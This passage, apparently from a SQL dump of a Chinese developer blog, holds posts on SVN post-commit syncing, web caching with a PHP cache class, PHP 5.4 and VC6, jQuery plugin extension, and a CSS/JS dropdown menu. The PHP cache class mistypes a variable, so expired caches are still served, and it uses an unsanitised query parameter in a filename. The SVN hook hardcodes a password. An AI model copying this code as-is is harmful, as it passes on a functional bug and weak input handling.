/>\r\nhttp://blog.chinaitlab.com/user1/563173/archives/2007/132713.html</p>\r\n\r\n<p><a id=\"tar3\" name=\"tar3\">[3]</a>怎样使用ssi,及其语法:<br />\r\nhttp://blog.csdn.net/dadou2007/archive/2008/06/08/2521365.aspx<br />\r\nNginx下的ssimodule<br />\r\nhttp://www.nginx.cn/NginxChsHttpSsiModule</p>\r\n\r\n<p><a id=\"tar4\" name=\"tar4\">[4]</a>asp.net的处理机制http://www.microsoft.com/china/msdn/library/webservices/asp.net/dnvs05Internals.mspx?mfr=true<br />\r\nhtml.asp.aspx运行效率比较<br />\r\nhttp://iamlibai.blogbus.com/logs/2017870.html</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>朱燚的技术博客,转载请注明出处<br />\r\nhttp://yizhu2000.cnblogs.com<br />\r\nhttp://blog.csdn.net/yizhu2000</p>\r\n',0,1429094245,0,0),(4,8,'windows中使svn提交后自动同步到web目录的方法','<p>windows版<br />\r\n假设你的web server domain是<br />\r\nhttp://your.com<br />\r\n<br />\r\n网站存放于<br />\r\nd:/web/<br />\r\n<br />\r\nsubversion安装在<br />\r\nc:/subversion/<br />\r\n<br />\r\nsvn版本库存放于<br />\r\nd:/test/<br />\r\n<br />\r\nsvn用户名和密码都是test<br />\r\n<br />\r\n需要在本机修改SVN后提交后，网站代码也随之更改。那么可以这样。<br />\r\n<br />\r\n第一步<br />\r\n在d:/web/用TortoiseSVN更新到最新版本库<br />\r\n<br />\r\n第二步<br />\r\n在d:/test/hooks/目录中新建一个post-commit.bat文件，写入以下一行内容<br />\r\nc:/subversion/bin/svn.exe update d:/web --username=test --password=test<br />\r\n<br />\r\n第三步<br />\r\n启动svn服务<br />\r\n命令行中输入<br />\r\nc:/subversion/bin/svnserve.exe --daemon --root d:/test<br />\r\n<br />\r\n测试更改提交一个文件，看看是否能自动同步<br />\r\n<br />\r\nlinux版参考http://blog.ihipop.info/2010/12/1893.html</p>\r\n',0,1429361126,0,0),(5,9,'WEB缓存原理','<p>先简单说下什么是缓存：缓存简单说来就是把一个代码执行过程产生的输出保存起来，可以存放在硬盘，内存，或者其他服务器上，</p>\r\n\r\n<p>缓存可以是任意格式的文件，内容也可以是完整的HTML，HTML片段XML,几个字符，一串字符串，比较常见的就是缓存文件例如smarty,smarttemplate模版的缓存，这个就是保存的html片断，而开源的discuz,phpwind等论坛程序，就是保存的字符串，这个字符串的特点就是一段完整的PHP代码，直接用include包含这个缓存文件就可以得到相关数组。还有些格式比如说小巧的sqlite,将PHP序列化为字符串保存在文件里，用的时候再反序列化等手段，其过程都是类似的。</p>\r\n\r\n<p>现在说更新缓存：通常的做法是在取缓存的时候先根据相关条件（如模版改动，缓存过期数据库变动等）判断缓存文件是否需要更新，如需更新则直接进行缓存更新，所以，一般有这样的代码片段：(以伪代码示例）<br />\r\nif(需要更新缓存==true){<br />\r\n这里就是缓存文件产生过程<br />\r\n}else{<br />\r\n取缓存文件的数据<br />\r\n}</p>\r\n\r\n<p>这样的方式可以称为同步更新缓存，同步更新有几个缺点，一是并发大了的情况，在更新文件的同时，另一个进程正在包含这个文件，有可能造成文件读写错误，二是如果更新过程过于慢长，用户端得到的一片空白，严重降低了用户体验。可以采取异步更新的机制来完善以上2个缺陷：当服务端检查到缓存需要更新，但并不立即更新，输出javascrīpt对客户端进行提示（需要更新缓存，请等待）或者压根就不提示用户，而采用过去缓存，并使用ajax或者包含框架的方式再次请求服务器，这次服务器才更新缓存，下一次请求就稍做检查就用上新缓存了，这样很容易的解决了以上问题，用户体验也不错，感觉不到空白的延迟时间段。</p>\r\n\r\n<p>举一个很简单的例子来说明异步更新缓存的过程：用户查询名字为包含xxx的数据:很明显这个查询语句是select name from table where name like &#39;%xxx%&#39;是全表搜索，name上的索引无效，我们可以把这个查询出来的数据做成xml,或者直接序列化结果保存在文件，文件名就为xxx,如果是搜索yyy的话，我们建立的文件名可以是yyy，遇见下一次查询用户名为xxx的时候，我们就可以直接取这个xxx缓存文件，从而饶开了查询数据库，这个是很好理解的。</p>\r\n\r\n<p>如果某时间insert了name包含xxx的数据，再新的查询中，我们需要进行缓存更新，现在我们则采用异步更新缓存的思路进行：直接给客户端返回js，提示需要等待更新，当新的xxx文件更新之后，服务端再输出js通知更新完毕，然后直接进行结果查看页，这个过程强调了用户体验，用户根本看不到空白的等待返回结果的信息，感觉到整个过程更加流畅。</p>\r\n\r\n<p>实例代码：<br />\r\n&lt;?php<br />\r\ndefine(&quot;_CachePath_&quot;,&quot;./cache/&quot;);<br />\r\ndefine(&quot;_CacheEnable_&quot;,&quot;1&quot;);<br />\r\ndefine(&quot;_ReCacheTime_&quot;,&quot;43200&quot;);<br />\r\ninclude(&#39;cache.php&#39;);<br />\r\n$cache=new cache();<br />\r\nif ($cache-&gt;check()){<br />\r\n&nbsp;&nbsp; &nbsp;$template=$cache-&gt;read();<br />\r\n}else{<br />\r\n&nbsp;&nbsp; &nbsp;ob_start();<br />\r\n&nbsp;&nbsp; &nbsp;ob_implicit_flush(0);<br />\r\n?&gt;<br />\r\n&nbsp;&nbsp; &nbsp;页面内容。。。。<br />\r\n&lt;?php<br />\r\n&nbsp;&nbsp; &nbsp;$template = ob_get_contents();<br />\r\n&nbsp;&nbsp; &nbsp;$cache-&gt;write($template);<br />\r\n}<br />\r\n?&gt;</p>\r\n\r\n<p>&lt;?<br />\r\nclass cache<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;var $cachefile;<br />\r\n&nbsp;&nbsp; &nbsp;var $cachefilevar;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;function cache()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//生成当前页的Cache组文件名 $this-&gt;cachefilevar 及文件名 $this-&gt;cachefile<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//动态页的参数不同对应的Cache文件也不同，但是每一个动态页的所有Cache文件都有相同的文件名，只是扩展名不同<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$s=array(&quot;.&quot;,&quot;/&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$r=array(&quot;_&quot;,&quot;&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;cachefilevar=str_replace($s,$r,$_SERVER[&quot;SCRIPT_NAME&quot;]).&quot;_&quot;.$_GET[_ActionVar_];<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;cachefile=$this-&gt;cachefilevar.&quot;.&quot;.md5($_SERVER[&quot;REQUEST_URI&quot;]);<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//删除当前页/模块的缓存<br />\r\n&nbsp;&nbsp; &nbsp;function delete()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//删除当前页的缓存<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$d = dir(_CachePath_);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$strlen=strlen($this-&gt;cachefilevar);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//返回当前页的所有Cache文件组<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while (false !== ($entry = $d-&gt;read()))<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (substr($entry,0,$strlen)==$this-&gt;cachefilevar)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (!unlink(_CachePath_.&quot;/&quot;.$entry)) {echo &quot;Cache目录无法写入&quot;;exit;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//判断是否已Cache过，以及是否需要Cache<br />\r\n&nbsp;&nbsp; &nbsp;function check()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//如果设置了缓存更新间隔时间 _ReCacheTime_<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (_ReCacheTime_+0&gt;0)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//返回当前页Cache的最后更新时间<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$var=@file(_CachePath_.&quot;/&quot;.$this-&gt;cachefilevar);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$var=$var[0];<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//如果更新时间超出更新间隔时间则删除Cache文件<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (time()-$var&gt;_ReCacheTime_)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$this-&gt;delete();$ischage=true;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//返回当前页的Cache<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$file=_CachePath_.&quot;/&quot;.$this-&gt;cachefile;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//判断当前页Cache是否存在 且 Cache功能是否开启<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return (file_exists($file) and _CacheEnable_ and !$ischange);<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//读取Cache<br />\r\n&nbsp;&nbsp; &nbsp;function read()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//返回当前页的Cache<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$file=_CachePath_.&quot;/&quot;.$this-&gt;cachefile;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//读取Cache文件的内容<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (_CacheEnable_) return readfile($file);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else return false;<br />\r\n&nbsp;&nbsp; &nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;//生成Cache<br />\r\n&nbsp;&nbsp; &nbsp;function write($output)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//返回当前页的Cache<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$file=_CachePath_.&quot;/&quot;.$this-&gt;cachefile;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//如果Cache功能开启<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (_CacheEnable_)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//把输出的内容写入Cache文件<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$fp=@fopen($file,&#39;w&#39;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (!@fputs($fp,$output)) {echo &quot;模板Cache写入失败&quot;;exit;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fclose($fp);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//如果设置了缓存更新间隔时间 _ReCacheTime_<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (_ReCacheTime_+0&gt;0)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;//更新当前页Cache的最后更新时间<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$file=_CachePath_.&quot;/&quot;.$this-&gt;cachefilevar;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$fp=@fopen($file,&#39;w&#39;);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (!@fwrite($fp,time())) {echo &quot;Cache目录无法写入&quot;;exit;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;@fclose($fp);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n?&gt;</p>\r\n',0,1429362221,0,0),(6,10,'PHP5.4为什么不支持VC6','<p>win下的apache是用VC6编译的，其插件(apache module)也必须用VC6编译。<br />\r\nPHP5.4为什么不支持VC6？因为VC6太旧了，1998年的工具..<br />\r\n不能用是指php以apache mod的方式不能用。现代php都以fast-cgi的方式挂载支持apache，连微软iis都放弃isapi转采用fast-cgi了。在不同的进程下，VC9的php fast-cgi通过进程间通讯支持apache，即使apache不是vc不是win版都没问题。。<br />\r\n去下载apache的mod_fcgid，然后把php配置到fcgid上。就可以用了<br />\r\n搜一搜教程很多。</p>\r\n',0,1429362612,0,0),(7,2,'jquery $.fn $.fx是什么意思','<p>$.fn是指jquery的命名空间，加上fn上的方法及属性，会对jquery实例每一个有效。<br />\r\n如扩展$.fn.abc()<br />\r\n那么你可以这样子：$(&quot;#div&quot;).abc();<br />\r\n通常使用extend方法扩展，详细请看API.</p>\r\n\r\n<p>$.fx是指jquery的特效。<br />\r\n如果使用显示、滑动、淡入淡出、动画等。<br />\r\n$.fx.off可以关闭动画，其实是直接显示结果。</p>\r\n\r\n<p>jquery的extend和fn.extend<br />\r\njQuery为开发插件提拱了两个方法，分别是：</p>\r\n\r\n<p>jQuery.fn.extend(object);<br />\r\njQuery.extend(object);</p>\r\n\r\n<p>jQuery.extend(object); 为扩展jQuery类本身.为类添加新的方法。<br />\r\njQuery.fn.extend(object);给jQuery对象添加方法。</p>\r\n\r\n<p><br />\r\nfn 是什么东西呢。查看jQuery代码，就不难发现。</p>\r\n\r\n<p>jQuery.fn = jQuery.prototype = {<br />\r\n&nbsp;&nbsp; &nbsp;init: function( selector, context ) {//....<br />\r\n&nbsp;&nbsp; &nbsp;//......<br />\r\n};</p>\r\n\r\n<p>原来 jQuery.fn = jQuery.prototype.对prototype肯定不会陌生啦。</p>\r\n\r\n<p>虽然 javascript 没有明确的类的概念，但是用类来理解它，会更方便。<br />\r\njQuery便是一个封装得非常好的类，比如我们用 语句 $(&quot;#btn1&quot;) 会生成一个 jQuery类的实例。</p>\r\n\r\n<p>jQuery.extend(object); 为jQuery类添加添加类方法，可以理解为添加静态方法。如：</p>\r\n\r\n<p>$.extend({<br />\r\n&nbsp;&nbsp; &nbsp;add:function(a,b){return a+b;}<br />\r\n});</p>\r\n\r\n<p>便为 jQuery 添加一个为 add 的 &ldquo;静态方法&rdquo;，之后便可以在引入 jQuery 的地方，使用这个方法了，<br />\r\n$.add(3,4); //return 7</p>\r\n\r\n<p>jQuery.fn.extend(object); 对jQuery.prototype进得扩展，就是为jQuery类添加&ldquo;成员函数&rdquo;。jQuery类的实例可以使用这个&ldquo;成员函数&rdquo;。<br />\r\n比如我们要开发一个插件，做一个特殊的编辑框，当它被点击时，便alert 当前编辑框里的内容。可以这么做：<br />\r\nJava代码 $.fn.extend({ alertWhileClick:function(){ $(this).click(function(){ alert($(this).val()); }); } }); $(&quot;#input1&quot;).alertWhileClick(); //页面上为：&lt;input id=&quot;input1&quot; type=&quot;text&quot;/&gt;</p>\r\n\r\n<p>$(&quot;#input1&quot;) 为一个jQuery实例，当它调用成员方法 alertWhileClick后，便实现了扩展，每次被点击时它会先弹出目前编辑里的内容。</p>\r\n\r\n<p>真实的开发过程中，当然不会做这么小白的插件，事实上jQuery提拱了丰富的操作文档，事件，CSS ,Ajax、效果的方法，结合这些方法，便可以开发出更加 Niubility 的插件。</p>\r\n\r\n<p>jquery(function(){})与(function(){}(jQuery)的区别<br />\r\n1.first<br />\r\njQuery(function(){});<br />\r\n全写为<br />\r\njQuery(docunemt).ready(function(){<br />\r\n});<br />\r\n意义为在DOM加载完毕后执行ready()方法<br />\r\n2.<br />\r\n(funtion(){<br />\r\n})(jQuery);<br />\r\n实际执行()(para)匿名方法，只不过传递了jQuery对象。<br />\r\n总结：jQuery(funtion(){});用于存放DOM对象的代码，执行其中代码时DOM对象已经存在。<br />\r\n不可用于存放开发插件代码。因为jQuery对象没有得到传递，外部通过jQuery.methodye<br />\r\n调用不来其中方法。<br />\r\n(funtion(){<br />\r\n})(jQuery);用于存放开发插件的代码，执行其中代码DOM不一定存在，直接自动执行DOM操作代码请小心使用</p>\r\n',0,1429362869,0,0),(8,3,'js+css无限级菜单实例','<p>&lt;!doctype html&gt;<br />\r\n&lt;html&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;title&gt;css+js无限级菜单&lt;/title&gt;<br />\r\n&lt;meta charset=&quot;UTF-8&quot;&gt;<br />\r\n&lt;style type=&quot;text/css&quot;&gt;<br />\r\n*{margin:0; padding:0; border:0;}<br />\r\nbody{font:12px/130% verdana,geneva,arial,helvetica,sans-serif,宋体;}li{list-style:none;}<br />\r\n.clearfix:after{content:&quot;&amp;nbsp;&quot;;display:block;height:0;clear:both;visibility:hidden;}.clearfix{display:inline-block;}<br />\r\na:link{ color:#000; text-decoration:none; }<br />\r\na:visited{ color:#000; text-decoration:none; }<br />\r\na:hover{ color:#000; text-decoration:none; }<br />\r\n.menu{ width:778px; height:26px; background:#fff; margin:0 auto;}<br />\r\n.menusel{ float:left;width:100px; position:relative; height:25px; background:#ddd; line-height: 25px; margin-left: 1px; *margin-left: 0px;_margin-left: -1px;}<br />\r\n.menusel h2{ font-size:12px; }<br />\r\n.menusel a{ display: block;text-align:center; width:100px;border:1px solid #a4a4a4; height:25px; border-bottom:1px solid #a4a4a4; position:relative; z-index:2;}<br />\r\n.menusel a:hover{ border:1px solid #a4a4a4; border-bottom:1px dashed #eeeeee; position:relative; z-index:2; height:25px;}<br />\r\n.ahover a{border-bottom:1px dashed #eeeeee; background:#eeeeee; }<br />\r\n.position{ position:absolute; z-index:1;}<br />\r\n.menusel ul{width:125px; background:#eee; border:1px solid #a4a4a4; margin-top: -1px; position:relative; z-index:1; display:none;}<br />\r\n.menusel .block{ display:block;}<br />\r\n.typeul li{border-bottom:1px dashed #a4a4a4;width:125px; position:relative; float:left; }<br />\r\n.typeul li a{ border:none;width:125px; }<br />\r\n.typeul li a:hover{ border:none; background:#ddd;}<br />\r\n.typeul{&nbsp; margin-left:0;&nbsp; }<br />\r\n.typeul ul{left:125px; top:0; position:absolute;}<br />\r\n.fli{ margin-left: -1px; border-left:#eeeeee solid 1px;}<br />\r\n.menusel .lli{ border:none; }<br />\r\n&lt;/style&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot;&gt;document.execCommand(&quot;BackgroundImageCache&quot;, false, true);&lt;/script&gt;&lt;!-- IE6背景图片闪烁问题&nbsp; --&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;div class=&quot;menu&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;div id=&quot;menu1&quot; class=&quot;menusel&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h2&gt;&lt;a href=&quot;http://www.codefans.net/jscss/&quot;&gt;菜单1&lt;/a&gt;&lt;/h2&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;div class=&quot;position&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul class=&quot;clearfix typeul&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项1-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项1-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项1-2-1&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项1-3-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项1-3-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项1-2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;http://www.codefans.net&quot;&gt;菜单选项1-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项1-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- position --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- menusel --&gt;</p>\r\n\r\n<p>&nbsp;&nbsp; &nbsp;&lt;div id=&quot;menu2&quot; class=&quot;menusel&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h2&gt;&lt;a href=&quot;#&quot;&gt;菜单2&lt;/a&gt;&lt;/h2&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;div class=&quot;position&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul class=&quot;clearfix typeul&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项2-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项2-2-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 